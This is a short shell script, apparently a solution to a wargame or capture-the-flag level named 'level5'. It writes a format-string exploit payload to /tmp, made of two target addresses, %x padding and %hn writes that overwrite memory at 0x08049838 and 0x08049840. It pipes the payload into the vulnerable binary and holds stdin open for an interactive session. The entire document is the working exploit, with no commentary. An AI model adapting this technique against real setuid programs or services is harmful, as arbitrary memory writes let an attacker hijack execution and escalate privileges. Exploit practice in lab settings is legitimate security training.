#!/bin/sh

# REQUIREMENTS:
# Python must be installed
# Must be on a x86, 32bit Linux architecture.

ADDRESS_LOW_ORDER_BYTES="\x38\x98\x04\x08"
ADDRESS_HIGH_ORDER_BYTES="\x40\x98\x04\x08"

echo $(python -c "print('$ADDRESS_HIGH_ORDER_BYTES' + 'AAAA' + '$ADDRESS_LOW_ORDER_BYTES' + '%x' * 2 + '%2029x' + '%hn' + '%31904x' + '%hn')") > /tmp/payload

cat /tmp/payload - | /home/user/level5/level5
rm /tmp/payload